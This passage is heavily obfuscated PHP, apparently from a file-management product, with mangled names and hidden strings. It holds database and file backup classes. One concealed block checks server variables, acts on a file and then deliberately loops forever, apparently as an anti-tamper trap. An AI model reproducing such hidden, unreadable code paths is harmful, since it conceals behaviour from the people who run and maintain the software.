array($¶´ı´Şİ[635], $ÌÉ¥î–[$¶´ı´Şİ[604]] . $ÇÌ°´è¯[$¶´ı´Şİ[190]] . $¶´ı´Şİ[636]); $ßŠ¹‚Ø = isset($ÇÌ°´è¯[$¶´ı´Şİ[2146]]) && in_array($¶´ı´Şİ[598], $ÇÌ°´è¯[$¶´ı´Şİ[2146]]); if (!$ßŠ¹‚Ø || !$„ÏŒäÅÎ || !$¥ëÒ­Âº || !$ÌÉ¥î–[$¶´ı´Şİ[502]]) { return; } if (!AuthModel::authCheckRoot($ÌÉ¥î–[$¶´ı´Şİ[502]][$¶´ı´Şİ[503]])) { return; } $Ú¬ªÑà· = $ÌÉ¥î–[$¶´ı´Şİ[589]] . $¶´ı´Şİ[12]; if ($Ú¬ªÑà· == $¶´ı´Şİ[91]) { unset($€Ğ‹âÉƒ[$¶´ı´Şİ[674]]); $€Ğ‹âÉƒ[$¶´ı´Şİ[188]] = self::TYPE_GROUP; return; } $é’Â°ä¼ = Model($¶´ı´Şİ[605])->groupChildrenAll($Ú¬ªÑà·); $•Ë­‰ÈÎ = count($é’Â°ä¼); if ($•Ë­‰ÈÎ <= 1) { return; } $ÁŸİ­Œ = array($¶´ı´Şİ[190] => 0, $¶´ı´Şİ[188] => self::TYPE_GROUP, $¶´ı´Şİ[589] => array($¶´ı´Şİ[7], $é’Â°ä¼)); $‘‰¬óèŠ = $this->field($¶´ı´Şİ[2466])->where($ÁŸİ­Œ)->limit($•Ë­‰ÈÎ)->select(); $€Ğ‹âÉƒ[$¶´ı´Şİ[674]] = array(); foreach ($‘‰¬óèŠ as $¦ÓïéŸ) { $€Ğ‹âÉƒ[$¶´ı´Şİ[674]][] = array($¶´ı´Şİ[635], $¶´ı´Şİ[613] . $¦ÓïéŸ[$¶´ı´Şİ[191]] . $¶´ı´Şİ[636]); } $€Ğ‹âÉƒ[$¶´ı´Şİ[674]][] = $¶´ı´Şİ[2287]; } } goto Aô¹ß±Œ¾º; Fƒ¼Ğ¹±±: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ıÀö·Ğˆ =& $_SERVER[ïÃ°£«Ê]; $É™ÓØÂö = Backup::get(); self::$io = $É™ÓØÂö[$ıÀö·Ğˆ[853]]; self::$name = $É™ÓØÂö[$ıÀö·Ğˆ[32]]; $°¤­õäĞ = new DbManage(); $š’´¯³Ø = $°¤­õäĞ->dbType(); $â­ÇØçÉ = array($ıÀö·Ğˆ[881] => $š’´¯³Ø, $ıÀö·Ğˆ[882] => time()); Backup::set($â­ÇØçÉ); $Á­Èœã‘ = $this->tmpFilesPath() . $ıÀö·Ğˆ[883] . self::$name . $ıÀö·Ğˆ[8]; del_dir($Á­Èœã‘); mk_dir($Á­Èœã‘); $˜ë‘¤ˆ = $ÆÅŞŞ•¸ = 0; try { $›‘¹•ğÚ = $°¤­õäĞ->db()->getTables(); } catch (Exception $…äİÁ ) { Backup::log($ıÀö·Ğˆ[884] . $…äİÁ ->getMessage()); return !1; } $›‘¹•ğÚ = array_diff($›‘¹•ğÚ, array($ıÀö·Ğˆ[885], $ıÀö·Ğˆ[886])); foreach ($›‘¹•ğÚ as $¸åñ§‚) { if ($¸åñ§‚ == $ıÀö·Ğˆ[472]) { continue; } $˜ë‘¤ˆ += $°¤­õäĞ->model($¸åñ§‚)->count(); } $¬ÂóŞ¬ó = new Task($ıÀö·Ğˆ[887], $ıÀö·Ğˆ[880], $˜ë‘¤ˆ, LNG($ıÀö·Ğˆ[888]) . $ıÀö·Ğˆ[889] . LNG($ıÀö·Ğˆ[890])); $GLOBALS[$ıÀö·Ğˆ[891]] = self::$name; foreach ($›‘¹•ğÚ as $¸åñ§‚) { $»Ş–û«Ï = $Á­Èœã‘ . $¸åñ§‚ . $ıÀö·Ğˆ[892]; if ($¸åñ§‚ == $ıÀö·Ğˆ[472]) { @touch($»Ş–û«Ï); continue; } $ÆÅŞŞ•¸ += $°¤­õäĞ->sqlFromDb($¸åñ§‚, $»Ş–û«Ï, $¬ÂóŞ¬ó); } unset($GLOBALS[$ıÀö·Ğˆ[891]]); $¬ÂóŞ¬ó->end(); if ($ÆÅŞŞ•¸ > $˜ë‘¤ˆ) { $˜ë‘¤ˆ = $ÆÅŞŞ•¸; } $â­ÇØçÉ = array($ıÀö·Ğˆ[881] => $š’´¯³Ø, $ıÀö·Ğˆ[877] => 1, $ıÀö·Ğˆ[893] => $˜ë‘¤ˆ, $ıÀö·Ğˆ[894] => $ÆÅŞŞ•¸, $ıÀö·Ğˆ[895] => time()); Backup::set($â­ÇØçÉ); if (!$˜ë‘¤ˆ || abs($˜ë‘¤ˆ - $ÆÅŞŞ•¸) / $˜ë‘¤ˆ > 0.01) { $–¯á–í = $ıÀö·Ğˆ[896]; if (!stristr(I18n::getType(), $ıÀö·Ğˆ[897])) { $–¯á–í = $ıÀö·Ğˆ[898]; } Backup::log(array($–¯á–í, $â­ÇØçÉ)); return !1; } return !0; } private function tmpFilesPath() { $ğé‹• =& $_SERVER[ïÃ°£«Ê]; $€ğ´ƒø = TEMP_FILES; if ($GLOBALS[$ğé‹•[6]][$ğé‹•[92]][$ğé‹•[899]]) { $€ğ´ƒø = $GLOBALS[$ğé‹•[6]][$ğé‹•[92]][$ğé‹•[899]]; if (!mk_dir($€ğ´ƒø) || !is_writable($€ğ´ƒø) || !IO::mkfile($€ğ´ƒø . $ğé‹•[900])) { $€ğ´ƒø = TEMP_FILES; } } return $€ğ´ƒø; } } class BackupDbFile { public function __construct() { } public function index() { $¬†˜ñÕŸ =& $_SERVER[ïÃ°£«Ê]; $ÌÈêÃÃİ = Backup::get(); $¹›İÅãë = $ÌÈêÃÃİ[$¬†˜ñÕŸ[32]]; $Û†¬À„ = $this->tmpFilesPath() . "\142\141\143\153\165\160\137{$¹›İÅãë}\57"; $á‹ó¹ëÎ = $this->backupPath($ÌÈêÃÃİ); if (!($á‹ó¹ëÎ = IO::mkdir($á‹ó¹ëÎ))) { Backup::log($¬†˜ñÕŸ[901] . $á‹ó¹ëÎ); return !1; } $“Â©Ó› = new DbManage(); $¬Æüµä = $“Â©Ó›->getSqlFile(); if (!$¬Æüµä || !$¬Æüµä[$¬†˜ñÕŸ[902]] || !$¬Æüµä[$¬†˜ñÕŸ[13]]) { Backup::log($¬†˜ñÕŸ[903]); return !1; } IO::move($¬Æüµä[$¬†˜ñÕŸ[902]], $Û†¬À„); IO::move($¬Æüµä[$¬†˜ñÕŸ[13]], $Û†¬À„); $“Â©Ó›->mixBakList($Û†¬À„); $»Ï›ÅÛ‰ = IO::listPath($Û†¬À„); $íÅ¸Ø¬¡ = isset($»Ï›ÅÛ‰[$¬†˜ñÕŸ[86]]) ? $»Ï›ÅÛ‰[$¬†˜ñÕŸ[86]] : array(); $¯¼šº“ = array_sum(array_column($íÅ¸Ø¬¡, $¬†˜ñÕŸ[79])); if (!$¯¼šº“) { Backup::log($¬†˜ñÕŸ[904] . $Û†¬À„); return !1; } $¶ĞĞÃã = array($¬†˜ñÕŸ[905] => $¯¼šº“, $¬†˜ñÕŸ[906] => time()); Backup::set($¶ĞĞÃã); Hook::trigger($¬†˜ñÕŸ[907], $Û†¬À„, $á‹ó¹ëÎ); $ƒÏğûÒÖ = new TaskFileTransfer($¬†˜ñÕŸ[907], $¬†˜ñÕŸ[880], count($íÅ¸Ø¬¡), LNG($¬†˜ñÕŸ[888]) . $¬†˜ñÕŸ[476] . LNG($¬†˜ñÕŸ[890]) . $¬†˜ñÕŸ[908]); $ƒÏğûÒÖ->task[$¬†˜ñÕŸ[865]] = $¯¼šº“; foreach ($»Ï›ÅÛ‰[$¬†˜ñÕŸ[86]] as $ìè„ƒ¶) { $¾’¾Åç = IO::move($ìè„ƒ¶[$¬†˜ñÕŸ[87]], $á‹ó¹ëÎ); if (!$¾’¾Åç) { $ƒÏğûÒÖ->end(); $ŸÙ‘¼¢ = IO::getLastError($¬†˜ñÕŸ[909] . $ìè„ƒ¶[$¬†˜ñÕŸ[87]] . $¬†˜ñÕŸ[910] . $á‹ó¹ëÎ . $¬†˜ñÕŸ[175]); Backup::log($ŸÙ‘¼¢); return !1; } } $ƒÏğûÒÖ->end(); $¶ĞĞÃã = array($¬†˜ñÕŸ[911] => $¯¼šº“, $¬†˜ñÕŸ[912] => time()); Backup::set($¶ĞĞÃã); return !0; } private function backupPath($ÜºğÒÚ) { $É¨ª™ûœ =& $_SERVER[ïÃ°£«Ê]; $¦Ùë×œÕ = $ÜºğÒÚ[$É¨ª™ûœ[32]]; $—÷˜®Üè = Model($É¨ª™ûœ[874])->get($É¨ª™ûœ[875]); $áèÒ»¢˜ = substr(md5($É¨ª™ûœ[876] . $—÷˜®Üè . $¦Ùë×œÕ), 0, 8); return "\x7b\151\x6f\x3a{$ÜºğÒÚ[$É¨ª™ûœ[853]]}\175\x2f\144\141\x74\141\142\x61\x73\x65\57\142\141\143\153\165\x70\57" . $¦Ùë×œÕ . $É¨ª™ûœ[11] . $áèÒ»¢˜; } private function tmpFilesPath() { $ï„û¦ßÆ =& $_SERVER[ïÃ°£«Ê]; $£û˜˜Şó = TEMP_FILES; if ($GLOBALS[$ï„û¦ßÆ[6]][$ï„û¦ßÆ[92]][$ï„û¦ßÆ[899]]) { $£û˜˜Şó = $GLOBALS[$ï„û¦ßÆ[6]][$ï„û¦ßÆ[92]][$ï„û¦ßÆ[899]]; if (!mk_dir($£û˜˜Şó) || !is_writable($£û˜˜Şó) || !IO::mkfile($£û˜˜Şó . $ï„û¦ßÆ[900])) { $£û˜˜Şó = TEMP_FILES; } } return $£û˜˜Şó; } } class BackupFile { protected $bakVer = "\x6f\154\144"; public function __construct($úïçú·Ç = false) { $Îš¬©”î =& $_SERVER[ïÃ°£«Ê]; $this->bakVer = $úïçú·Ç ? $Îš¬©”î[913] : $Îš¬©”î[914]; } public function index() { $î¨é¬ÑÓ = Backup::get(); $ñ²‚‡»¢ = $î¨é¬ÑÓ[$_SERVER[ïÃ°£«Ê][857]][$_SERVER[ïÃ°£«Ê][230]][$_SERVER[ïÃ°£«Ê][557]]; $™şâŞÙ• = array($_SERVER[ïÃ°£«Ê][558] => array($_SERVER[ïÃ°£«Ê][915], $ñ²‚‡»¢), $_SERVER[ïÃ°£«Ê][916] => array($_SERVER[ïÃ°£«Ê][406], $î¨é¬ÑÓ[$_SERVER[ïÃ°£«Ê][853]])); $…Õ×ªåŸ = (int) Model($_SERVER[ïÃ°£«Ê][917])->where($™şâŞÙ•)->count($_SERVER[ïÃ°£«Ê][557]); $ÏÌÆî˜ = (int) Model($_SERVER[ïÃ°£«Ê][917])->where($™şâŞÙ•)->sum($_SERVER[ïÃ°£«Ê][79]); $ç¡¤ÙÀÛ = new TaskFileTransfer($_SERVER[ïÃ°£«Ê][918], $_SERVER[ïÃ°£«Ê][880], $…Õ×ªåŸ, LNG($_SERVER[ïÃ°£«Ê][888]) . $_SERVER[ïÃ°£«Ê][889] . LNG($_SERVER[ïÃ°£«Ê][919])); $ç¡¤ÙÀÛ->task[$_SERVER[ïÃ°£«Ê][865]] = $ÏÌÆî˜; $Ø¤ÛĞù‘ = array($_SERVER[ïÃ°£«Ê][920] => $…Õ×ªåŸ, $_SERVER[ïÃ°£«Ê][921] => $ÏÌÆî˜, $_SERVER[ïÃ°£«Ê][922] => time()); Backup::set($Ø¤ÛĞù‘); $Š¾ãûæ‹ = !0; $¡ÆĞ‰æì = $this->storeIds(); $éÅ£î¾¯ = 1; $ ¶şª¼µ = 1000; $ÏÙ Õ…Ø = $Ú³¥ı– = 0; $÷ùîŸöœ = array(); $¥±«‚Æß = $õ¶Å¼öÆ = 0; do { $Îõ…ş÷Ò = $_SERVER[ïÃ°£«Ê][923]; $èÈûïÉ = Model($_SERVER[ïÃ°£«Ê][917])->where($™şâŞÙ•)->field($Îõ…ş÷Ò)->order($_SERVER[ïÃ°£«Ê][924])->selectPage($ ¶şª¼µ, $éÅ£î¾¯); $Ÿâ×Å× = !empty($èÈûïÉ[$_SERVER[ïÃ°£«Ê][446]]) ? $èÈûïÉ[$_SERVER[ïÃ°£«Ê][446]] : array(); foreach ($Ÿâ×Å× as $å²æÅÕÜ) { if (!$this->_fileExist($å²æÅÕÜ, $÷ùîŸöœ, $¡ÆĞ‰æì)) { Backup::log($_SERVER[ïÃ°£«Ê][925] . $å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][557]] . $_SERVER[ïÃ°£«Ê][926] . $å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][87]]); continue; } $¾£­€Öİ = $å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][87]]; $ÏÏ»…åÑ = "\x7b\151\x6f\x3a{$î¨é¬ÑÓ[$_SERVER[ïÃ°£«Ê][853]]}\x7d" . substr($¾£­€Öİ, strlen("\x7b\x69\x6f\x3a{$å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][927]]}\x7d")); if (IO::exist($ÏÏ»…åÑ)) { $ç¡¤ÙÀÛ->updateFileEnd($å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][32]], $å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][79]]); } else { $ÏÏ»…åÑ = get_path_father($ÏÏ»…åÑ); IO::mkdir($ÏÏ»…åÑ); if (!IO::copy($¾£­€Öİ, $ÏÏ»…åÑ, $_SERVER[ïÃ°£«Ê][928])) { Backup::log($_SERVER[ïÃ°£«Ê][929] . $¾£­€Öİ . $_SERVER[ïÃ°£«Ê][910] . $ÏÏ»…åÑ . $_SERVER[ïÃ°£«Ê][175]); $Š¾ãûæ‹ = !1; break; } } $ñ²‚‡»¢ = $å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][557]]; $Ú³¥ı– += 1; $ÏÙ Õ…Ø += $å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][79]]; $õ¶Å¼öÆ += 1; $¥±«‚Æß += $å²æÅÕÜ[$_SERVER[ïÃ°£«Ê][79]]; if ($ÏÙ Õ…Ø >= 1024 * 1024 * 100) { $Ø¤ÛĞù‘ = array($_SERVER[ïÃ°£«Ê][852] => $ñ²‚‡»¢, $_SERVER[ïÃ°£«Ê][930] => $õ¶Å¼öÆ, $_SERVER[ïÃ°£«Ê][931] => $¥±«‚Æß); Backup::set($Ø¤ÛĞù‘); $ÏÙ Õ…Ø = $Ú³¥ı– = 0; } } $İ¸ÍÌ¥ = count($Ÿâ×Å×); $éÅ£î¾¯++; } while ($İ¸ÍÌ¥ == $ ¶şª¼µ); $ç¡¤ÙÀÛ->end(); $Ø¤ÛĞù‘ = array($_SERVER[ïÃ°£«Ê][932] => 1, $_SERVER[ïÃ°£«Ê][863] => time(), $_SERVER[ïÃ°£«Ê][879] => 1, $_SERVER[ïÃ°£«Ê][852] => $ñ²‚‡»¢, $_SERVER[ïÃ°£«Ê][933] => time()); if ($Ú³¥ı–) { $Ø¤ÛĞù‘[$_SERVER[ïÃ°£«Ê][930]] = $õ¶Å¼öÆ; $Ø¤ÛĞù‘[$_SERVER[ïÃ°£«Ê][931]] = $¥±«‚Æß; } Backup::set($Ø¤ÛĞù‘); return !0; } private function _fileExist($Ã’Ì‰ñÛ, &$óè«»×Ë, $ÓºÌ††) { $üÂØ—©ı =& $_SERVER[ïÃ°£«Ê]; $‡ˆ­½ƒÀ = $Ã’Ì‰ñÛ[$üÂØ—©ı[87]]; if (in_array($Ã’Ì‰ñÛ[$üÂØ—©ı[557]], $óè«»×Ë)) { return !1; } if (!in_array($Ã’Ì‰ñÛ[$üÂØ—©ı[927]], $ÓºÌ††)) { return !1; } if (IO::exist($‡ˆ­½ƒÀ)) { return !0; } $ÅêÉã½‹ = get_path_father($‡ˆ­½ƒÀ); if (IO::exist($ÅêÉã½‹)) { $óè«»×Ë[] = $Ã’Ì‰ñÛ[$üÂØ—©ı[557]]; return !1; } $ïÅÖğ—± = array($üÂØ—©ı[927] => $Ã’Ì‰ñÛ[$üÂØ—©ı[927]], $üÂØ—©ı[87] => array($üÂØ—©ı[473], "{$ÅêÉã½‹}\45")); $ÁŠò§Èê = Model($üÂØ—©ı[917])->where($ïÅÖğ—±)->field($üÂØ—©ı[558])->select(); $óè«»×Ë = array_merge($óè«»×Ë, array_to_keyvalue($ÁŠò§Èê, $üÂØ—©ı[12], $üÂØ—©ı[557])); return !1; } private function _fileFilter($´¸ğÃõÂ) { $«òŒ¿É =& $_SERVER[ïÃ°£«Ê]; return; if (empty($´¸ğÃõÂ)) { return; } $İ°Ú‘¾ï = array($«òŒ¿É[557] => array($«òŒ¿É[7], array_unique($´¸ğÃõÂ))); $•˜ÖÓ›¥ = Model($«òŒ¿É[934])->where($İ°Ú‘¾ï)->field($«òŒ¿É[191])->select(); foreach ($•˜ÖÓ›¥ as $’êŒ»Ğ‹) { Model($«òŒ¿É[934])->remove($’êŒ»Ğ‹[$«òŒ¿É[191]], !1); } } private function storeIds() { $°ãÛ¨Œº =& $_SERVER[ïÃ°£«Ê]; $Î¢¹˜Ğ = Model($°ãÛ¨Œº[869])->listData(); $ÔôÜ½Ñ¾ = array(); $Ú¯«ıÖû = $GLOBALS[$°ãÛ¨Œº[6]][$°ãÛ¨Œº[92]][$°ãÛ¨Œº[935]]; foreach ($Î¢¹˜Ğ as $û»ØË“) { $Ç£¾…¤² = strtolower($û»ØË“[$°ãÛ¨Œº[96]]); if (!isset($Ú¯«ıÖû[$Ç£¾…¤²])) { continue; } $ºÚê‚½ş = $°ãÛ¨Œº[77] . (isset($Ú¯«ıÖû[$Ç£¾…¤²]) ? $Ú¯«ıÖû[$Ç£¾…¤²] : ucfirst($Ç£¾…¤²)); if (!class_exists($ºÚê‚½ş)) { continue; } $ÔôÜ½Ñ¾[] = $û»ØË“[$°ãÛ¨Œº[487]]; } return $ÔôÜ½Ñ¾; } public function start($ÉôåäŠ, $éÈ‹¸¤ü) { $‘÷‰é×› =& $_SERVER[ïÃ°£«Ê]; $«Ñ² à¿ = KodIO::makePath(KodIO::KOD_IO, $ÉôåäŠ); if (!$this->checkStore($ÉôåäŠ)) { write_log($‘÷‰é×›[936] . $«Ñ² à¿, $‘÷‰é×›[937]); return; } $ëÏÎ‹ = KodIO::defaultDriver(); if ($ëÏÎ‹[$‘÷‰é×›[487]] == $ÉôåäŠ) { write_log($‘÷‰é×›[938] . $«Ñ² à¿, $‘÷‰é×›[937]); return; } $˜êş²ÎŞ = $‘÷‰é×›[939]; $¡¶£“‹Ñ = Task::get($˜êş²ÎŞ); if ($¡¶£“‹Ñ) { if ($¡¶£“‹Ñ[$‘÷‰é×›[851]] == $‘÷‰é×›[940]) { return; } Task::kill($˜êş²ÎŞ); } $ØİĞ®•£ = array($‘÷‰é×›[853] => $ÉôåäŠ, $‘÷‰é×›[557] => 0, $‘÷‰é×›[204] => 0, $‘÷‰é×›[857] => array($‘÷‰é×›[860] => 0, $‘÷‰é×›[941] => 0, $‘÷‰é×›[865] => 0, $‘÷‰é×›[942] => 0, $‘÷‰é×›[943] => 0)); $÷Ö‘ş÷¤ = Model($‘÷‰é×›[874])->get($‘÷‰é×›[944], $‘÷‰é×›[880]); $÷Ö‘ş÷¤ = json_decode($÷Ö‘ş÷¤, !0); if (!$÷Ö‘ş÷¤) { $÷Ö‘ş÷¤ = array(); } if ($÷Ö‘ş÷¤[$‘÷‰é×›[853]] && $÷Ö‘ş÷¤[$‘÷‰é×›[853]] != $ÉôåäŠ) { $÷Ö‘ş÷¤[$‘÷‰é×›[557]] = 0; $÷Ö‘ş÷¤[$‘÷‰é×›[853]] = $ÉôåäŠ; } $÷Ö‘ş÷¤ = array_merge($ØİĞ®•£, $÷Ö‘ş÷¤); $âÆ²œ = _get($GLOBALS, $‘÷‰é×›[7], array()); if ($âÆ²œ[$‘÷‰é×›[856]] == $‘÷‰é×›[91] && $âÆ²œ[$‘÷‰é×›[945]] == $‘÷‰é×›[91] || !$÷Ö‘ş÷¤[$‘÷‰é×›[557]]) { $÷Ö‘ş÷¤ = $ØİĞ®•£; } $«Ñ² à¿ = KodIO::makePath(KodIO::KOD_IO, $÷Ö‘ş÷¤[$‘÷‰é×›[853]]); $õ¦µİ…È = $«Ñ² à¿ . $‘÷‰é×›[946]; if (!file_exists($õ¦µİ…È)) { $Ÿ—ÙŒ™ï = file_get_contents(__DIR__ . $‘÷‰é×›[947]); if (defined($‘÷‰é×›[948]) && INSTALL_CHANNEL) { $Ÿ—ÙŒ™ï = str_replace($‘÷‰é×›[949], INSTALL_CHANNEL, $Ÿ—ÙŒ™ï); } file_put_contents($õ¦µİ…È, $Ÿ—ÙŒ™ï); } $‡ö¾¸¹„ = $éÈ‹¸¤ü * 60 * 0.8; $€±±Û‹… = timeFloat(); $êÄÓ’éÛ = Model($‘÷‰é×›[560]); $ëº“°Óş = array($‘÷‰é×›[558] => array($‘÷‰é×›[915], $÷Ö‘ş÷¤[$‘÷‰é×›[557]])); $ê¥¯Ú¥º = $êÄÓ’éÛ->field(array($‘÷‰é×›[950] => $‘÷‰é×›[951], $‘÷‰é×›[952] => $‘÷‰é×›[79]))->where($ëº“°Óş)->find(); if (!$ê¥¯Ú¥º[$‘÷‰é×›[951]]) { return; } $ŸÏˆ„‡¹ = intval($ê¥¯Ú¥º[$‘÷‰é×›[951]]); $·îÑÄÙÄ = intval($ê¥¯Ú¥º[$‘÷‰é×›[79]]); $÷Ö‘ş÷¤[$‘÷‰é×›[857]][$‘÷‰é×›[860]] += $ŸÏˆ„‡¹; $÷Ö‘ş÷¤[$‘÷‰é×›[857]][$‘÷‰é×›[865]] += $·îÑÄÙÄ; $÷Ö‘ş÷¤[$‘÷‰é×›[204]] = time(); Model($‘÷‰é×›[874])->set($‘÷‰é×›[944], $÷Ö‘ş÷¤, $‘÷‰é×›[880]); $¡¶£“‹Ñ = new TaskFileTransfer($˜êş²ÎŞ, $‘÷‰é×›[880], $ŸÏˆ„‡¹, LNG($‘÷‰é×›[888]) . $‘÷‰é×›[889] . LNG($‘÷‰é×›[919])); $¡¶£“‹Ñ->task[$‘÷‰é×›[865]] = $·îÑÄÙÄ; $îÍ‰š¥Ã = 500; $œÚ˜¯ğâ = 1; $×úØÇã„ = $‘÷‰é×›[923]; $·”®à¸ = $êÄÓ’éÛ->where($ëº“°Óş)->field($×úØÇã„)->order($‘÷‰é×›[924])->selectPage($îÍ‰š¥Ã, $œÚ˜¯ğâ); $¯á­²—¨ = array($‘÷‰é×›[860] => 0, $‘÷‰é×›[953] => 0, $‘÷‰é×›[943] => 0, $‘÷‰é×›[954] => $÷Ö‘ş÷¤[$‘÷‰é×›[557]], $‘÷‰é×›[955] => 0); $ŸÚÆö•¹ = intval($·”®à¸[$‘÷‰é×›[443]][$‘÷‰é×›[445]]); while ($·”®à¸ && $œÚ˜¯ğâ <= $ŸÚÆö•¹) { if (timeFloat() - $€±±Û‹… > $‡ö¾¸¹„) { break; } foreach ($·”®à¸[$‘÷‰é×›[446]] as $Ëî×ÎÍ‘) { if (timeFloat() - $€±±Û‹… > $‡ö¾¸¹„) { break; } $¯á­²—¨[$‘÷‰é×›[860]]++; $¯á­²—¨[$‘÷‰é×›[955]] = $Ëî×ÎÍ‘[$‘÷‰é×›[557]]; $÷Ö‘ş÷¤[$‘÷‰é×›[557]] = $Ëî×ÎÍ‘[$‘÷‰é×›[557]]; $÷Ö‘ş÷¤[$‘÷‰é×›[857]][$‘÷‰é×›[941]]++; $÷Ö‘ş÷¤[$‘÷‰é×›[857]][$‘÷‰é×›[942]] += $Ëî×ÎÍ‘[$‘÷‰é×›[79]]; $÷Õ„­Ú‚ = $Ëî×ÎÍ‘[$‘÷‰é×›[87]]; if (!$this->isFileExist($Ëî×ÎÍ‘, $êÄÓ’éÛ)) { $¡¶£“‹Ñ->updateFileEnd($Ëî×ÎÍ‘[$‘÷‰é×›[32]], $Ëî×ÎÍ‘[$‘÷‰é×›[79]]); $÷Ö‘ş÷¤[$‘÷‰é×›[857]][$‘÷‰é×›[943]]++; $¯á­²—¨[$‘÷‰é×›[953]]++; write_log($‘÷‰é×›[925] . $Ëî×ÎÍ‘[$‘÷‰é×›[557]] . $‘÷‰é×›[926] . $÷Õ„­Ú‚, $‘÷‰é×›[937]); continue; } $Æ§š†´ = $«Ñ² à¿ . substr($÷Õ„­Ú‚, strlen("\173\151\157\x3a{$Ëî×ÎÍ‘[$‘÷‰é×›[927]]}\x7d\x2f")); if (IO::exist($Æ§š†´)) { $¡¶£“‹Ñ->updateFileEnd($Ëî×ÎÍ‘[$‘÷‰é×›[32]], $Ëî×ÎÍ‘[$‘÷‰é×›[79]]); continue; } $Æ§š†´ = get_path_father($Æ§š†´); if (!IO::copy($÷Õ„­Ú‚, $Æ§š†´, REPEAT_SKIP)) { $÷Ö‘ş÷¤[$‘÷‰é×›[857]][$‘÷‰é×›[943]]++; $¯á­²—¨[$‘÷‰é×›[943]]++; write_log($‘÷‰é×›[956] . $Ëî×ÎÍ‘[$‘÷‰é×›[557]] . $‘÷‰é×›[926] . $÷Õ„­Ú‚, $‘÷‰é×›[937]); } $¡¶£“‹Ñ->updateFileEnd($Ëî×ÎÍ‘[$‘÷‰é×›[32]], $Ëî×ÎÍ‘[$‘÷‰é×›[79]]); } Model($‘÷‰é×›[874])->set($‘÷‰é×›[944], $÷Ö‘ş÷¤, $‘÷‰é×›[880]); $œÚ˜¯ğâ++; $·”®à¸ = $êÄÓ’éÛ->where($ëº“°Óş)->field($×úØÇã„)->order($‘÷‰é×›[924])->selectPage($îÍ‰š¥Ã, $œÚ˜¯ğâ); } $¡¶£“‹Ñ->end(); write_log($‘÷‰é×›[957] . json_encode($¯á­²—¨), $‘÷‰é×›[937]); if (IO::mkdir($«Ñ² à¿ . $‘÷‰é×›[958])) { $¯á­²—¨[$‘÷‰é×›[955]] = $÷Ö‘ş÷¤[$‘÷‰é×›[557]]; IO::setContent($«Ñ² à¿ . $‘÷‰é×›[959] . date($‘÷‰é×›[960]) . $‘÷‰é×›[961], json_encode($¯á­²—¨)); } Model($‘÷‰é×›[874])->set($‘÷‰é×›[944], $÷Ö‘ş÷¤, $‘÷‰é×›[880]); return !0; } private function isFileExist($‚¡†­ğ, $ÂÖ¹·ëš) { $‰òàâ‹ =& $_SERVER[ïÃ°£«Ê]; static $”‚­¥… = null; static $„ª´ó¨  = null; if (is_null($”‚­¥…)) { $”‚­¥… = $„ª´ó¨  = array(); } $Ñ¯ªŸ¤™ = $‚¡†­ğ[$‰òàâ‹[927]]; $»Ğ¥÷£ = KodIO::parse($‚¡†­ğ[$‰òàâ‹[87]]); if ($Ñ¯ªŸ¤™ != $»Ğ¥÷£[$‰òàâ‹[487]]) { return !1; } if (!isset($”‚­¥…[$Ñ¯ªŸ¤™])) { $”‚­¥…[$Ñ¯ªŸ¤™] = $this->checkStore($Ñ¯ªŸ¤™); } if ($”‚­¥…[$Ñ¯ªŸ¤™] !== 1) { return !1; } if (in_array($‚¡†­ğ[$‰òàâ‹[557]], $„ª´ó¨ )) { return !1; } $¹’˜ºè = $‚¡†­ğ[$‰òàâ‹[87]]; if (IO::exist($¹’˜ºè)) { return !0; } $‘­ÄŞÆƒ = get_path_father($¹’˜ºè); if (IO::exist($‘­ÄŞÆƒ)) { $„ª´ó¨ [] = $‚¡†­ğ[$‰òàâ‹[557]]; return !1; } $®‡ìÕıÏ = array($‰òàâ‹[927] => $Ñ¯ªŸ¤™, $‰òàâ‹[87] => array($‰òàâ‹[473], "{$‘­ÄŞÆƒ}\45")); $Îµ›ëü  = $ÂÖ¹·ëš->where($®‡ìÕıÏ)->field($‰òàâ‹[558])->select(); $„ª´ó¨  = array_merge($„ª´ó¨ , array_to_keyvalue($Îµ›ëü , $‰òàâ‹[12], $‰òàâ‹[557])); return !1; } public function checkStore($ÌË²³´) { static $ñä°æ•ˆ; if (is_null($ñä°æ•ˆ)) { $ñä°æ•ˆ = Model($_SERVER[ïÃ°£«Ê][869]); } $ä©™¶¹ß = $ñä°æ•ˆ->listData($ÌË²³´); if (!$ä©™¶¹ß) { return 0; } try { $åœïÚì£ = $ñä°æ•ˆ->checkConfig($ä©™¶¹ß, !0); } catch (Exception $á“·™ü) { $åœïÚì£ = !1; } return $åœïÚì£ === !0 ? 1 : 0; } } goto f÷Š…Ï™ñÑ; FÒÔÊå¡ì: if (!isset($_SERVER[$_SERVER[ïÃ°£«Ê][1035]]) || !isset($_SERVER[$_SERVER[ïÃ°£«Ê][1227]])) { $_getc = $_SERVER[ïÃ°£«Ê][1038]; $_getfile = $_SERVER[$_SERVER[ïÃ°£«Ê][1039]] . $_SERVER[ïÃ°£«Ê][1040]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïÃ°£«Ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[ïÃ°£«Ê][709]) { $exit = $_SERVER[ïÃ°£«Ê][1041]; $exit(); } $_act = $_SERVER[ïÃ°£«Ê][1228]; $_act($_SERVER[$_SERVER[ïÃ°£«Ê][1039]] . $_SERVER[ïÃ°£«Ê][1040]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ïÃ°£«Ê][463]); } } class DbManage { public $message = ''; function __construct($Õé¥æª¬ = array()) { $ùË¦•µ‡ =& $_SERVER[ïÃ°£«Ê]; if (empty($Õé¥æª¬)) { $Õé¥æª¬ = $GLOBALS[$ùË¦•µ‡[6]][$ùË¦•µ‡[21]]; } $this->database = $Õé¥æª¬; } public function model($­ÈÏ™’¶ = '') { return new ModelBase($­ÈÏ™’¶, $_SERVER[ïÃ°£«Ê][12], $this->database); } public function db($½‘é“çÅ = false) { $üöÜôÚ =& $_SERVER[ïÃ°£«Ê]; $ŞÅä“™Ç = array_change_key_case($this->database); if ($this->dbType() == $üöÜôÚ[13] || !$½‘é“çÅ) { return $this->model()->db(); } $†¥„İù¯ = 